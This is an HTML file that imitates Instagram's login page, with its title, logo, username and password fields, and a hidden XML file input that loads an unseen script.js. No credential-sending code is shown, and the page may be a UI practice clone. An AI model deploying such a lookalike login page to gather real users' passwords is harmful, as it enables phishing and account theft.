<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="page-wrap">
      <div class="login-box">
        <div class="brand" aria-label="Instagram">
          <img src="assets/instagram-logo.svg" alt="Instagram logo" class="brand-logo" />
          <span class="brand-text">Instagram</span>
        </div>

        <form id="loginForm">
          <input id="username" type="text" placeholder="Phone number, username or email" />
          <input id="password" type="password" placeholder="Password" />
          <button type="submit" class="login-btn">Log in</button>
        </form>

        <div class="divider">
          <span>OR</span>
        </div>

        <p class="forgot">Forgot password?</p>
      </div>

      <div class="signup-box">
        <span>Don't have an account?</span>
        <a href="#">Sign up.</a>
      </div>

      <input id="xmlFileInput" type="file" accept=".xml" hidden />
    </div>

    <script src="script.js"></script>
  </body>
</html>
